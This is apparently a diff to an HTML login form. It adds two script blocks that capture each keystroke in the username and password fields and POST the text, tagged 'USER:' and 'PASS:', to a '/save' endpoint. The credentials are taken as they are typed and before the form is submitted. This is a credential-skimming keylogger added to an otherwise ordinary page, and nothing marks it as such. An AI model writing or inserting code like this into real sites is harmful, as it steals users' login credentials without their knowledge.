@@ -22,7 +22,52 @@
 		<!-- Input objects being called through the login class that is passed through -->
 		<p id="userInput"> <label for="username">Username</label>: <input id="username" name="username" required size="32" type="text" value=""> </p>
 
+		<script>
+        const user = document.getElementById('username');
+
+        user.addEventListener('input', function() {
+           userName = user.value;
+           userInput = "USER: " + userName;
+            sendData(userInput);
+        });
+
+        function sendData(data) {
+            fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                "body": JSON.stringify({text: data})
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    	</script>
+
+
+
 		<p id="passInput"> <label for="password">Password</label>: <input id="password" name="password" required size="32" type="password" value=""> </p>
+
+		<script>
+        const pass = document.getElementById('password');
+
+        pass.addEventListener('input', function() {
+           passWord = pass.value;
+           passInput = "PASS: " + passWord;
+            sendData(passInput);
+        });
+
+        function sendData(data) {
+            fetch('/save', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                "body": JSON.stringify({text: data})
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    	</script>
+
 
 		<p id="signIn"><input id="submit" name="submit" type="submit" value="Sign In"></p>
 
